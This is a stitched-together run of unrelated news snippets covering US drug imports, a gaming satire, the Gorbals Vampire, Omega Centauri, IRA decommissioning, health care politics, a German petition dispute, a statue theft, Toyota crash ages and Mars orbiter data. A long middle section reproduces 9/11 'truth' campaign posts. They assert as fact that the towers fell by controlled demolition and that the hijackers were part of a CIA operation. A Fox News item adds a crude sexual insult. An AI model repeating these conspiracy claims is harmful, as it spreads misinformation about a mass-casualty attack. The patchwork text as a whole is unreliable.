Schweitzer was first involved in the issue during an unsuccessful U.S. Senate run in 2000 , when he made cheap Canadian drugs a cornerstone of his platform and would take busloads of seniors north of the border to buy drugs .
The issue has been debated in Washington , D.C. , over the years .
Recently , the U.S. Senate rejected a plan to let Americans import prescription drugs from abroad .
Such a change would deprive drug makers of billions of dollars .
Both the pharmaceutical industry and the Obama administration also have argued that such plans would not protect people from potentially dangerous or ineffective drugs
Recent advances in motion controller technology as exhibited by Sony 's PlayStation Move and Microsoft 's Project Natal reveal a future where newer generations of gamers could play things like sports or in places like " outside . "
" These technologies show that we 're not far off from more active children , " said futurologist Ben Carlson .
" The evolution has been rapid .
First controllers vibrated , then the Wiimote simulated bowling , and now Project Natal has us jumping around the living room .
At this pace kids could be playing outside by 2015 . "
Game companies have remained quiet about any future technologies that might have kids playing outside , but one Sony engineer did hint that " things were happening . "
And from Microsoft , the company behind motion capture controller Project Natal , images have been circulating the Internet showing a teenager throwing a football though its authenticity has not been verified .
Carlson said a future of kids playing looks imminent , but by no means is assured .
" The Earth could be destroyed by a planet - smashing asteroid , or a zombie plague could wipe out 98 % of the population .
I do n't think we'd have to worry about kids going outside under those scenarios , " he said .
Vicki Wilson of the Parents for Safety First organization said the group his worried about the impact this future technology might have on children .
" It 's bad enough these new contraptions have kids moving around the living room instead of sitting safely on the couch , but to actually have them moving around outside ?
We work tirelessly to stop the plague of skinned knees and bruised elbows , only to have something like this come around . "
Wilson suspects that companies like Band - Aid manufacturer Johnson & Johnson might be helping fund research into these products .
" Who else has more to gain from seeing our kids bleed ? " she said .
Representatives from Johnson & Johnson , Microsoft , Nintendo , Sony or Burger King did not return our calls .

Now I can't decide which one I want :
By Stuart Nicolson
BBC Scotland News
When Pc Alex Deeprose was called to Glasgow 's sprawling Southern Necropolis on the evening of 23 September 1954 , he expected to be dealing with a simple case of vandalism .
Please turn on JavaScript .
Media requires JavaScript to play .
But the bizarre sight that awaited him was to make headlines around the world and cause a moral panic that led to the introduction of strict new censorship laws in the UK .
Hundreds of children aged from four to 14 , some of them armed with knives and sharpened sticks , were patrolling inside the historic graveyard .
They were , they told the bemused constable , hunting a 7ft tall vampire with iron teeth who had already kidnapped and eaten two local boys .
Fear of the so - called Gorbals Vampire had spread to many of their parents , who begged Pc Deeprose for assurances there was no truth to the rumours .
Newspapers at the time reported that the headmaster of a nearby primary school told everyone present that the tale was ridiculous , and police were finally able to disperse the crowd .
But the armed mob of child vampire hunters was to return immediately after sunset the following night , and the night after that .
Urban myth Ronnie Sanderson , who was an eight - year - old schoolboy in the Gorbals area of the city when the vampire scare was at its height , described how Chinese whispers in the schoolyard escalated into full - blown panic .
He recalled : " It all started in the playground - the word was there was a vampire and everyone was going to head out there after school .
" At three o'clock the school emptied and everyone made a beeline for it .
We sat there for ages on the wall waiting and waiting .
I would n't go in because it was a bit scary for me .
Ronnie Sanderson ( left ) and Tam Smith joined the vampire hunters " I think somebody saw someone wandering about and the cry went up : ' There 's the vampire ! '
" That was it - that was the word to get off that wall quick and get away from it .
" I just remember scampering home to my mother : ' What 's the matter with you ? '
' I 've seen a vampire ! ' and I got a clout round the ear for my trouble .
I did n't really know what a vampire was . "
There were no records of any missing children in Glasgow at the time , and media reports of the incident began to search for the origins of the urban myth that had gripped the city .
The blame was quickly laid at the door of American comic books with chilling titles such as Tales From The Crypt and The Vault of Horror , whose graphic images of terrifying monsters were becoming increasingly popular among Scottish youngsters .
Corrupt comics
These comics , so the theory went , were corrupting the imaginations of children and inflaming them with fear of the unknown .
A few dissenting academics pointed out there was no mention of a creature matching the description of the Gorbals Vampire in any of these comics .
There was , however , a monster with iron teeth in the Bible ( Daniel 7.7 ) and in a poem taught in local schools .
The Southern Necropolis provided the perfect setting for a vampire story
But their voices were drowned out in the media and political frenzy that was by now demanding action to be taken to prevent even more young minds from being " polluted " by the " terrifying and corrupt " comic books .
The government responded to the clamour by introducing the Children and Young Persons ( Harmful Publications )
Act 1955 which , for the first time , specifically banned the sale of magazines and comics portraying " incidents of a repulsive or horrible nature " to minors .
Another of those who had gathered at the graveyard as a child , Tam Smith , said the Necropolis provided the perfect stage for a vampire story to take root , with the noise and light from the nearby ironworks casting spooky shadows across the graves in which some 250,000 Glaswegians had been laid to rest .
Mr Smith said it had been common for naughty children in the area to be threatened with the Iron Man - a local equivalent of the Bogeyman - by their exasperated parents .
Holy Grail Neither Mr Smith or Mr Sanderson had televisions in their homes at the time , and neither had ever seen a horror movie or read a horror comic .
Comic book expert Barry Forshaw said getting their hands on one of the underground American horror comics had been like finding the Holy Grail for schoolyards of British children reared on the squeaky clean fare found every week inside the Beano and Dandy - both of which are produced in Scotland .
The story of the Gorbals Vampire had been a gift to the unlikely alliance of teachers , communists and Christians who had their own individual reasons for crusading against the corrupting influence of American comics , he said .
Mr Forshaw added : " It was a perfect fit .
Here was a campaign that was looking for things to justify itself , and then this event happens .
" It is ironic that the moral furore began in Scotland , where the comics could not have been more safe . "
The Gorbals Vampire will be broadcast on BBC Radio 4 at 2300 GMT on Tuesday 30 March , and will be available on BBC iPlayer .

Millions of Stars in Omega Centauri
Image Credit & Copyright : Fred Lehman ( South Florida Dark Sky Observers )
Explanation : Featured in the sharp telescopic image , globular star cluster Omega Centauri ( NGC 5139 ) is some 15,000 light - years away and 150 light - years in diameter .
Packed with about 10 million stars much older than the Sun , Omega Cen is the largest of 200 or so known globular clusters that roam the halo of our Milky Way galaxy .
Though most star clusters consist of stars with the same age and composition , the enigmatic Omega Cen exhibits the presence of different stellar populations with a spread of ages and chemical abundances .
In fact , Omega Cen may be the remnant core of a small galaxy merging with the Milky Way .
The IRA split into official and provisional wings in 1969 A second republican paramilitary organisation has announced it has disposed of its weapons .
The Official IRA made the announcement on the same day that the INLA confirmed it had decommissioned its arms .
In 1969 , the IRA split into the Official IRA and the Provisional IRA .
The long - dormant Official IRA took a more socialist line , announcing its ceasefire in 1972 , while the Provisionals became more militant .
The Provisional IRA completed its decommissioning in 2005 .
The timing of the announcements by the INLA and the Official IRA is thought to be linked to the expiry on Tuesday of legislation which allows illegal groups to decommission weapons without fear of prosecution .
Many of the INLA 's initial recruits were believed to have come from the Official IRA after its ceasefire .
It is thought the Official IRA - known as the " Stickies " - were behind more than 50 murders , mostly in the early 1970s .
Despite having been on ceasefire for more than three decades , it had sporadically used weapons during internal republican disputes or for so - called punishment attacks .
The group said in a statement on Monday it had abandoned violence and its engagement with General John de Chastelain 's Independent International Commission on Decommissioning was successful .
" The purpose of this engagement was to ensure that all weapons which were under the control of the Official IRA or to which the Official IRA had access were accounted for and transferred to the control of the decommissioning body .
" We have emphasised our commitment to removing any doubts that may exist that there are any Official IRA weapons in circulation .
" To this end an extensive nationwide inventory has been completed to confirm and verify that all such equipment has been located , identified and transferred to the decommissioning body .
Any other such equipment , which has not been submitted to the decommissioning process , has no association with the Official IRA . "

“ Politically , I get the ‘ let ’s trip up the other side , make them fail ’ strategy , ” he said .
“ But what ’s more important , to win extra seats or to shape the most important piece of social legislation since the 1960s ?
It was a go - for - all - the - marbles approach .
Unless they produced an absolute failure for Mr. Obama , there was n’t going to be any political benefit . ”

Republicans also face the question of what happens if the health care bill does not create the cataclysm that they warned of during the many months of debate .
Closing out the floor debate on Sunday night , the House Republican leader , Representative John A. Boehner of Ohio , warned that the legislation would be “ the last straw for the American people . ”
Representative Marsha Blackburn , Republican of Tennessee , proclaimed several hours earlier , “ Freedom dies a little bit today . ”
Yet there are elements of the bill , particularly in regulating insurers , that could well prove broadly popular , and it could be years before anyone knows whether the legislation will have big effects on health care quality and the nation ’s fiscal condition .
Indeed , most Americans with insurance are unlikely to see any immediate change in their coverage , and several Republicans warned that the party could pay a price for that .
“ When our core group discover that this thing is not as catastrophic as advertised , they are going to be less energized than they are right now , ” Mr. Frum said .
He warned that the energy Republicans were finding now among base voters would fade .
The head of the Democratic Senatorial Campaign Committee , Senator Robert Menendez of New Jersey , offered a similar argument .
“ When this bill goes into effect , and none of the things Republicans warned about begin to happen — none of the death panels , none of the government takeover , none of the socialism — Republicans will have no credibility , ” Mr. Menendez said .
The final deliberations , which drew protesters from across the country , including many Tea Party activists , cast an angry tone to the proceedings that also stirred concern among some Republicans .
Some Democratic lawmakers said they had been taunted with racial epithets and homophobic slurs as they walked into the Capitol over the weekend to vote .
Representative Randy Neugebauer , Republican of Texas , shouted out “ baby - killer ” on the House floor when Representative Bart Stupak of Michigan , one of the most fervent Democratic opponents of abortion in the House , outlined a deal he had worked out with the White House , which he said assured that the health care bill would not finance abortions .
UK Family seeks new 9/11 inquest .
posted August 18 , 2020
With support from AE911 the family of Geoffrey Campbell , a UK citizen who died in the North Tower , plans to file a petition on the upcoming anniversary of 9/11 to reopen the inquest into the murder of their loved one .
The reopening of Geoff 's inquest under the UK Coroners Act of 1988 provides a uniquely promising opportunity to establish in a court of law that the destruction of the Twin Towers was caused by pre-planted explosives and incendiaries and not by the impact of the airplanes , as cited in the first inquest
For a new inquest to be ordered , the Campbells only need to show that the coroner in the first inquest did not have all the material facts and that the new evidence may change the original verdict .

Multiple court cases still challenge official 9/11 line .
posted August 18 , 2020
Saudi Role ; CIA and FBI under scrutiny
a ) A massive action is ongoing in New York by 9/11 families who suspect that Saudi Arabia helped to organise the attacks .
b ) Grand Jury sought : again in the New York courts the 3000 strong Arthitects and Enginers for 9/11 Truth ( AE911 ) keep chipping away , publicising technical failings of the official 9/11 story and petitioning for a Grand Jury to take a detailed look at the evidence .
Geoffrey Berman the US Attorney General for South New York wrote to say he would respond to the Grand Jury petition but did not say how or when .
Berman was recently sacked after falling out with Trump .
There was speculation in the MSM that Berman had refused to hush up the Epstein case .
c ) Florida FBI agents reported that the Saudi government had been aiding and abetting the alleged 9/11 hijackers in the weeks before 9/11 , but their report was hushed up .
The Florida courts are being asked to order the release of relevant FBI documents
d ) Questions remain about the CIA 's Osama Bin Laden unit which apparently had no inkling that 9/11 was on its way but at the same time actively obstructed FBI agents investigating the alleged hijackers in the weeks before the attacks .
Even the existence of the special highly secret unit with dozens of agents remained hidden from the public for two years after 9/11 , while politicians said the events were unthinkable and came out of the blue .
Key whistleblower Richard Clark , White House counter terror czar at the time has since stated that the CIA deceived him and were helping the alleged hijackers evade detection .
University of Alaska engineers report : official story impossible
posted August 18 , 2020
The most detailed modelling ever of the collapse of WTC 7 from the University of Alaska Engineering Department , has been peer reviewed since the report was launched in 2019 .
Hours after the Twin Towers collapsed the third skyscraper fell spectacularly at freefall speed for no obvious reason .
The official theory published years after the event said the collapse was powered by the building 's own weight but researchers conclude this could not account for the speed an d symmetry of the collapse .
So far the mainstream media has ignored the story
Long list of eyewitnesses report explosions during 9/11 attacks
posted August 18 , 2020
A group of researchers has published a long list of quotes from credible 9/11 witnesses who all explicitly mention hearing explosions as the Twin Towers unexpectedly collapsed .
The official story insists that the buildings collapsed downwards at near freefall speed , powered only by their own weight .

US COURTS TAKE AN INTEREST IN 9/11
No more sovereign immunity for Saudis
posted 2 September 2019
There is lots of action in the US courts .
In 2016 , in a major setback for Washington , Barack Obama 's veto was overridden and US law was changed to strip immunity from foreign diplomats in cases of terrorism .
Now a key New York DA has hinted to Lawyers Committee for a 9/11 Inquiry that they have set up a secret Grand Jury to investigate the 9/11 Tower Collapses .
The Lawyers Committee are moving to set up similar probes in other jurisdictions and extend the scope of the New York Grand Jury to investigate more individuals
Meanwhile the FBI is in court in Washington and Florida fighting off the release of documents thought to list more links between alleged 9/11 hijackers and Saudi Arabia .
CRUCIAL 9/11 REPORT OUT IN A FEW DAYS
University engineers on WTC7 collapse
Updated 2 October 2019
Prior to 9/11 no steel frame building had collapsed but on that day three massive towers were brought down , each in a symmetrical near freefall way and each with a different explanation from Washington 's NIST agency
The Hulsey report based on several years of computer modelling has confirmed that the partially freefall collapse of WTC7 , which fell hours later , must have been caused by the near instantaneous failure of all the columns .
It is now up to NIST to show what could have caused that - other than a controlled demolition .
posted 2 September 2019
The Hulsey Report ( from Alaska Uni engineering Department on the bizarre collapse of WTC7 ) is set to be released in the next few days and is expected to find the official story of the fall of WTC7 is impossible .
This could open a major fissure in the so far successful campaign to keep the truth from the public .
Noam Chomsky , a flawed left leader , has specifically mentioned the lack of expert support as a reason to ignore us .
Meanwhile Franklin Square Fire Commissioners , a local New York fire department , have pronounced the official story impossible and are lobbying the authorities energetically

9/11 paper trail hots up , CIA accused in Newsweek
posted 6 September 2018
While we await the publication of the Alaska University report on the collapse of WTC 7 there have been more developments on the 9/11 paper trail .
The notorious 28 pages of a 9/11 Congressional report , censored since 2003 , confirmed Saudi involvement in 9/11 .
Now the CIA 's role in allowing the attacks to happen is also on the MSM agenda with a hard hitting article in Newsweek .
Relatives are demanding the full release of all 9/11 documents .
9/11 sceptics hope that in the Trump induced Washington turmoil turmoil more damaging info will come out .
In one of his many political personas Trump has himself expressed doubt on 9/11 .
A key leader of the impeach Trump movement is none other than John Brennan , CIA station chief in Riyadh in the run-up to 9/11 .
Brennan is sounding hysterical in his calls for Trump 's removal .
Sceptics hope it is because Trump just might release all the documents .

6. 9/11 : The unanswered questions
Kevin Ryan , a leading 9/11 blogger , lists 16 points here , one for each year since the attacks .
There are so many unanswered questions about the 9/11 attacks that it can be hard to summarise them .
Here are some possible talking points for dealing with 9/11 believers ...
Experts at the University of Alaska have shown the impossibility of the official explanation for the collapse of WTC7 .
The skyscraper was not hit by a plane in the 9/11 attacks but still fell symmetrically , partly at freefall acceleration .
There is now a consensus in the mainstream media that the 9/11 anthrax attacks which purported to be from Muslim terrorists in fact came from a laboratory in the US Military Industrial complex .
There is a near consensus in the MSM that the alleged 9/11 hijackers were supported in the US by sections of the Saudi government .
It is now clear , based on official US reports ( 9/11 Commission and Inspector General reports ) and the statements of FBI officers , that the alleged 9/11 hijackers were part of a CIA operation and protected from arrest by individuals in the CIA .
After the attacks Western leaders said the US and CIA ignored multiple warnings because they had lost interest in Afghanistan .
But now we know the CIA 's top secret Osama Bin Laden Unit had up to 80 active officers and its own secret premises in the run-up to 9/11 .
What were they doing ?
If anyone finds it incredible that a faction in Washington would participate in a terrorist atrocity in the US there is an official plan , Operation Northwoods , proposing to do just that .
If anyone finds it incredible that the whole of the mainstream media would parrot an easily disprovable lie , that is exactly what happened in the invasion of Iraq based on non-existent WMD .
No -one has been sacked as a result .

3. Comment : The 911 Paper Trail Hots Up .
The last year has seen the MSM eat their words and admit there was a 911 conspiracy .
The one they are admitting to at present puts only Saudi Arabia in the official frame , but many FBI officers and even Washington 's official watchdogs , the departmental Inspector Generals , confirm : the CIA 's top secret Osama Bin Laden unit was helping the alleged 9/1 hijackers too .
Who might have been behind the CIA / Saudi plot to help and protect the alleged 9/11 hijackers ?
Disgruntled officers making trouble to get some attention and budgets ?
Or was the criminal network controlled by the Bush White House and its belligerent neocon allies in the military industrial complex , Israel , NATO , Pakistan etc ?
Here 's a possible clue : we know that when it came to the great Iraq WMD hoax the CIA 's evidence was indeed fabricated by a neocon network : the Office of Special Plans based in the White House under Dick Cheney .
There are even suggestions from insiders like the FBI 's Ali Soufan that the torture of Al Qaeda suspects was part of the Iraq invasion plan too : to produce false evidence linking 911 with Iraq .
Edinburgh firefighter resigns over ignored safety risk to colleagues
April 9 , 2016
Bosses accused Brian Maxwell of bringing the Scottish Fire and Rescue Service into disrepute for calling for an inquiry into the collapse of World Trade Centre Building 7 in New York on 9/11 .
He was interviewed for the online documentary ' INCONTROVERTIBLE ' , which has had over 500,000 hits on Youtube .
The 47 storey building housed offices from agencies like the CIA and the SEC , as well as the City 's Emergency Command Centre , but it was evacuated amid reports of bombs and later collapsed at free fall speed into its own footprint even though it was not hit by a plane .
Washington 's NIST was given the job of investigating and concluded that the collapse is not suspicious , the result of simple office fires - but Maxwell says that if this is correct many other steel framed buildings are at risk of instant collapse during a fire , posing a catastrophic risk to firefighters everywhere .
WTC 7 collapsed in around seven seconds .
The NIST computer models remain a state secret and their report , delivered seven years after the collapse , has never been peer reviewed .

RI911 Condemns Censorship Plans
October 2014 : Extracts from our press release ...
Reinvestigate 911 condemns government plans to creates a concept new to British public discourse : non-violent extremism .
This week Theresa May outlined plans for draconian legal controls on individuals not suspected or accused of advocating violence .
As Hilary Clinton conceded while Secretary of State , the NATO powers are losing the propaganda war , increasingly seen as aggressors and warmongers .
Rather than ask why , the easy response is to shoot the messenger .
Here in the UK Ofcom already claims the right to regulate internet news sites under little noticed passages of New Labour 's Communication Act
13 years after the 9/11 attacks authorities still feel they have to proclaim the discredited official 9/11 story and smear sceptics as conspiracy theorists .
Reinvestigate 911 will continue to draw attention to the impossibilities and contradictions in the official 9/11 story for as long as we are legally permitted .

Matt Campbell lost his brother in the 9/11 attacks is fed up with waiting for answers to the many questions that the US government has left unanswered about the events that launched an era of wars , surveillance and militarism .
After approaching the UK authorities and coroner it has become clear to Matt that they have all accepted the US version of events entirely on trust .

Fox " News " anchor Bret Baier 's contentious interview with President Obama yesterday has become very popular on the right , mostly because Baier interrupted President Obama in mid-sentence a total of 16 times in under 20 minutes , thus making his interrupt frequency nearly once - per-minute , almost tying Bill O'Reilly for rudeness .
Of course , what his conservative fans do n't get around to mentioning is that Mr. Baier has previously interviewed one other president , and he was considerably more polite the first time around .
In fact , one might almost use the word " deferential " to describe it .
And if one were slightly less charitable than that , one might even describe it as " Two - bit hack under orders from Roger Ailes administers slobbery oral sex " .
If ever there was an area of taxation that needed simplification , it is the American corporate income tax .
Companies end up filing tax returns containing thousands , or even tens of thousands , of pages .
In such length and complexity , opportunities lurk for any company that is willing to take aggressive tax positions .
They might be virtually sure to lose if the Internal Revenue Service understood how something on Page 1,235 had interacted with something on Page 2,947 and challenged the result , but there is at least a reasonable chance the I.R.S. auditor would not figure it out .
“ Today , ” complained the I.R.S. commissioner , Douglas H. Shulman , in a recent speech , “ we spend up to 25 percent of our time in a large corporate audit searching for issues rather than having a straightforward discussion with the taxpayer about the issues . ”
To save that time , and to learn about things that are being missed , the I.R.S. is trying to require companies to give the agency a road map not only of the games that are being played , but of the maximum possible tax hit that companies would take if the I.R.S. chose to challenge them .
Abgeordnetenbestechung zu heikel für den Petitionsausschuss ?
Silvio Duwe
Der Ausschuss lehnt die Veröffentlichung einer entsprechende Petition ab - ohne Begründung
Fast alle im Bundestag vertretenen Parteien mussten sich in den letzten Wochen vermehrt Vorwürfen aussetzen , käuflich zu sein .
Standen ursprünglich wegen der Spende aus der Hotelbranche für die FDP , der Vermietung der Ministerpräsidenten Jürgen Rüttgers und Stanislaw Tillich ( beide CDU ) die Parteien der Regierungskoalition in der öffentlichen Kritik , mussten sich bald auch die SPD und die Grünen an der Saar Vorwürfe gefallen lassen , sie seien käuflich .
Den Bürgern drängt sich dabei immer wieder der Eindruck auf , dass niemand dieser Art der Beeinflussung von Politik ernsthaft Einhalt gebieten kann .
Letztendlich leidet darunter auch das Ansehen der Demokratie bei den Menschen .
Mit der Einschätzung , dass es derzeit keine ausreichenden Möglichkeiten zur Sanktionierung von Korruption gibt , sind die Bürger jedoch nicht allein .
Auch Transparency International kritisiert , dass die Regelungen , die das Strafgesetzbuch zum Thema Abgeordnetenbestechung enthält , nicht ausreichend sind .
Bisher ist es nach § 108e lediglich verboten , Stimmen bei Wahlen oder in einer Abstimmung der Volksvertreter zu kaufen oder zu verkaufen .
'' Belohnungen ' ' im Nachhinein für '' gutes ' '
Verhalten bei Abstimmungen oder Einflussnahme bei der Vorbereitung von Entscheidungen in Ausschüssen beispielsweise stehen jedoch nicht unter Strafe , der Paragraph zur Abgeordnetenbestechung greift zu kurz .
Auch deshalb hat die Bundesrepublik die UN - Konvention gegen Korruption bisher nicht ratifiziert .
Auf diesen Missstand wollte der ehemalige SPD - Bundestagsabgeordnete Jörg Tauss mit einer Petition aufmerksam machen .
Immerhin , so schreibt Tauss in seinem Blog , dürfe der Bundestag kein rechtsfreier Raum bleiben .
Mit Verweis auf die jüngsten Spendenskandale fordert Tauss in seiner Petition den Bundestag auf , " dem Eindruck einer zunehmenden Verflechtung von Geld und Politik auch durch eine unverzügliche Umsetzung der UN - Konvention gegen Korruption in Deutschland entgegen zu treten , in dem er seinen langjährigen mehrheitlichen Widerstand gegen eine juristisch handhabbare und wirkungsvolle Verschärfung von § 108e StGB ( Abgeordnetenbestechung ) aufgibt " .
Offenbar war dem Petitionsausschuss dieses
Thema zu heikel .
Zwar wurde die Petition angenommen , von einer Veröffentlichung als Online - Petition wollte der Ausschuss aber nichts wissen .
Ohne nähere Begründung lehnte dies der Petitionsausschuss in einem Schreiben an Tauss ab , das der Redaktion vorliegt .
Auf Nachfrage konnte der Ausschuss keine Begründung für die Ablehnung der Petition nennen .
Ein Sprecher verwies jedoch auf das Recht des Ausschusses , die Veröffentlichung von Petitionen nach Ziffer 4 der Verfahrensgrundsätze ablehnen zu dürfen .
Diese besagt , dass eine Veröffentlichung unter anderem dann unterlassen werden kann , wenn die Petition " geeignet erscheint , den sozialen Frieden , die internationalen Beziehungen oder den interkulturellen Dialog zu belasten " .
Tauss ist sich sicher , dass die Erwähnung des Eindrucks , die Politik sei käuflich , der Grund für die ablehnende Haltung des Petitionsausschusses ist .
Auf eine Begründung der Ablehnung verzichtet man beim Petitionsausschuss
Auch auf die Frage , wer für die Entscheidung , die Petition nicht ins Netz zu stellen , verantwortlich ist , antwortet der Ausschuss nur äußerst ungern .
Für konkrete Fälle könne man dazu grundsätzlich nichts sagen , so der Sprecher .
Allerdings würde die Entscheidung in keinem Fall von Einzelpersonen getroffen .
Das Recht zu einer solchen Entscheidung hätten sowohl die Obleute , der gesamte Petitionsausschuss , aber auch in anderen Personenkonstellationen könnten Entscheidungen getroffen werden .
Im Fall der Petition von Tauss legen Äußerungen aus dem Umfeld des Ausschusses den Schluss nahe , dass die Entscheidung von der Verwaltung des Petitionsausschusses getroffen wurde .
Zwar befasst sich der Petitionsausschuss nun trotz der Nichtveröffentlichung mit dem Thema der Abgeordnetenbestechung , ein Makel jedoch bleibt : Da die Petition nicht auf der Petitionsseite des Bundestages veröffentlicht wurde , bleibt dem Thema eine Diskussion auf dieser zentralen Plattform verwehrt .
Für den Petenten bedeutet dies zusätzlich eine deutliche Erschwerung beim Sammeln von Unterschriften .
Zwar steht es Tauss laut Auskunft des Petitionsausschusses trotzdem zu , die für eine besondere Berücksichtigung des Anliegens notwendigen 50.000 Unterschriften zu sammeln , jedoch wird dies durch die verweigerte Veröffentlichung deutlich erschwert , wenn nicht gar unmöglich .
Damit sind die Chancen , dass sich der Petitionsausschuss in einer seiner kommenden Sitzungen mit dem Thema explizit befassen und eine Einzelabstimmung durchführen muss , deutlich gesunken .
Der Vorgang zeigt zugleich auch die Grenzen des bundesdeutschen Petitionswesens auf : Petitionen sind lediglich Bitten , die keine rechtsverbindlichen Konsequenzen haben .
Zwar muss sich der Petitionsausschuss mit jeder einzelnen eingegangenen Petition beschäftigen , doch schon das Begründen einer Ablehnung gehört zu den freiwilligen Zusatzaufgaben des Ausschusses .
Eine Entscheidung des Petitionsausschusses juristisch anzufechten um damit die Behandlung eines
Themas zu erzwingen , ist aussichtslos .
Da Petitionen mangels direktdemokratischer Elemente auf Bundesebene die einzige Möglichkeit für Bürger sind , auf politische Entscheidungen in Berlin stärkeren Einfluss zu nehmen , als dies durch beispielsweise durch Kundgebungen möglich ist , stellt sich die Frage , ob eine deutliche Verbesserung der Transparenz oder gar der Ausbau der demokratischen Mitwirkungsmöglichkeiten ein Gebot der Stunde ist .
Deutschland kein Vorbild für Bekämpfung der Korruption
Zugleich ist es problematisch , dass die offene Diskussion über bisherige Versäumnisse bei der Bekämpfung von Korruption offenbar als schädlicher für die Demokratie empfunden wird als die Korruption selbst .
Die Frage nach finanziellen Zuwendungen an Parteien und Politiker ist eine ebenso wiederkehrende wie unangenehme , wie der Umgang der Politik selbst mit diesem Thema zeigt .
Im Jahr 2005 wollte Bundestagspräsident Norbert Lammert die soeben beschlossene Offenlegung von Nebeneinkünften schnell wieder einkassieren .
Nach der Wahl 2009 ließ er sich mit der Veröffentlichung genau dieser Angaben mehr Zeit als erlaubt .
Die Vermietung von Ministerpräsidenten in Nordrhein - Westfalen und Sachsen war für ihn aus juristischer Sicht in Ordnung .
Gestern konterte die SPD mit einem Gutachten , von Prof. Dr. Hans Michael Heinig , dessen Kurzfassung dieser Redaktion vorliegt .
In diesem kommt Heinig zu dem Schluss , dass politische Gespräche mit Regierungsmitgliedern im Rahmen einer Sponsoring - Veranstaltung untaugliche Gegenleistungen seien .
Die daraus erzielten Einnahmen würden eine nach dem Parteiengesetz verbotene Spende darstellen , so Heinig weiter .
Ob das Gutachten eine erneute Prüfung der Vorgänge bewirken wird , bleibt abzuwarten .
Im Abschlussbericht des G8 - Gipfels von Heiligendamm wird mit großen Worten verkündet , dass die G8 - Staaten sich ihrer Führungsrolle bewusst seien , " wenn es darum geht , bei der Bekämpfung der Korruption beispielgebend zu sein " .
Auch die Ratifikation der UN - Konvention gegen Korruption wurde von den G8 als Ziel genannt .
Abseits von Gipfeldokumenten bewegt sich diesbezüglich noch zu wenig .
Auch mit der Frage , ob die Petition von Jörg Tauss doch noch veröffentlicht werden soll , wird sich der Petitionsausschuss wohl noch einmal beschäftigen müssen .
Laut Tauss gibt es mittlerweile eine , nicht von ihm eingereichte Petition zur Veröffentlichung seiner Petition .

Norwich —
A Willimantic man will be arraigned today and further arrests are expected in connection with the theft and destruction of a 120 - year - old bronze statue from the grave of Sarah Osgood in the Yantic Cemetery .
The theft upset local art and gravestone preservation advocates , who feared the worst for the life - size statue of a kneeling woman that had been atop Osgood 's flat gravestone .
Police charged Sean P. McNee , 43 , of 182 South Park St. , Willimantic , with first - degree larceny , first - degree criminal mischief and desecration of a grave site .
He was held on a $ 150,000 bond pending today 's arraignment .
More arrests are expected , said Norwich police detective Lt. Stephany Bakoulis .
The 450 - pound , 120 - year - old bronze statue was reported missing on Feb. 19 by city Public Works Department crews doing maintenance in the cemetery .
Five days later , police received information on the location of " a portion of the statue . "
Police soon were able to recover most of the statue , which had been cut into several pieces .
Police said the statue was valued at $ 35,000 .
After what Bakoulis described as an intense investigation , police obtained a warrant for McNee , who was arrested Monday morning at his home without incident .
The arrest confirmed rumors that have been circulating for the past week that the statue had been destroyed .
" I am truly discouraged to hear this , " said Vivian Zoe , curator at the Slater Memorial Museum .
" An arrest is a good thing and will , hopefully , make others reconsider an act like this .
The piece was truly magnificent and for over a century graced the Sarah Osgood grave unmolested . "
Zoe and David Oat , cemetery historian and preservation advocate , said they hope the incident sparks renewed interest in protecting the city 's historic cemeteries .
Oat plans to meet with others to form a Friends of Yantic Cemetery group that could help repair other vandalized grave sites and perhaps close and lock the swinging wrought iron gates at night .
" My sincere hope is that it can be repaired or re-created , " Zoe said .
" There are many terrific artists in the area who could probably do the work . "
Nelson Dale , owner of Restoration Services in Arlington , Mass. , said the statue could be restored , although it would be a major job .
Missing pieces would have to be molded and cast anew , he said .
Dale recently worked on a similar but much smaller restoration of a bronze statue of St. Edith Stein that had been vandalized .
Someone hacked at the statue with an ax , cutting off several fingers and leaving hack marks at the side of the head .
The vandal left a note : " Do n't pray to statues . "
Anyone with information can call police ( 860 ) 886-5561 or the anonymous tip line at ( 860 ) 886-5561 ext. 500 .
Dating back to 1992 models , LA Times reporters found 56 deaths reported to NHTSA over the course of 19 model - years .
If Toyota is suffering from electronic problems , these electronic problems should affect all drivers equally .
If Toyota sudden acceleration is caused by driver pedal misapplication , then we should expect to see a disproportionate number of elderly and short drivers .
Unfortunately , we do n’t have driver heights , and in only 24 of the 56 cases , did the Times list the age of the driver .
The ages : 18 , 21 , 22 * , 32 , 34 , 44 , 45 , 47 , 56 , 57 , 58 , 60 , 61 , 63 , 66 , 68 , 71** , 72 , 72 , 77 , 79 , 83 , 85 , 89 .
* Passenger victim was 22 and “ friend ” of driver .
** Passenger victim was 71 and married to husband - driver for 46 years .
The median age is 60.5 ; the majority of drivers are 60 or older ; a third are older than 70 .
And I left out the case of a driver who was the son of a 94 - year - old victim rather than guesstimate his age to be 65 .
That looks suspiciously like the makeup of Audi sudden acceleration cases , and a lot like driver error to me .
Color me skeptical .
Very very skeptical .
Update , March 12 : Megan McArdle has done some very impressive journalism following up on my work to fill in the gaps that the LA Times left out .
Here ’s her spreadsheet .
( McArdle also has the guts to mention the disproportionate number of immigrants in the sample , which I did n’t . )
Her report makes me realize I made a mistake in the sequence above : I confused an 89 - year - old passenger with a 71 - year - old driver .
In addition , the driver I conservatively estimated to be 71 above turns out to have been 75 .
And McArdle says that a driver I listed as 61 is 60 .
Here ’s McArdle ’s more complete and more accurate sequence ; I ’ve estimated three of the ages where they were not listed :
18 , 21 , 21 * , 20s** , 32 , 34 , 36 , 44 , 45 , 47 , 56 , 56 , 57 , 58 , 60 , 60 , 63 , 60s *** , 66 , 68 , 71 , 72 , 72 , 75 , 75 , 77 , 77 , 79 , 83 , 87
* Driver was with 21 - year - old friend
** Driver had girlfriend and young daughter
*** Driver was picking up 67 - year - old friend for church .
This actually strengthens my case : the median age is 60 , 16 out of 30 ( or 15 out of 29 ) are 60 or older ( as compared to 16 % of drivers in all automotive fatalities ) — that ’s a relative risk of over 6 .
We ’ve gone from a small sample size of 24 to a slightly less small sample size of 29 - 30 , improving statistical significance .

How much is 100 terabits ?
This graphic compares the 100 terabits of data collected by NASA 's Mars Reconnaissance Orbiter with other data storage mediums commonly used on Earth .
NASA ?s Mars Reconnaissance Orbiter ( MRO ) may be the baby ofthe fleet of spacecraft currently studying the red planet .
But the probe has beennothing short of prolific with its Martian observations and recently surpassedmore than 100 terabits of data .
That number , announced by NASA recently , does n't mean muchto most of us , so SPACE.com has calculated what 100 terabits are invarious more everyday measures .
Altogether , 100 terabits is 100 trillion bits of informationand would take up 17,000 700 MB CDs .
That would be about 4 million songs , witheach lasting about three minute - quite the album collection .
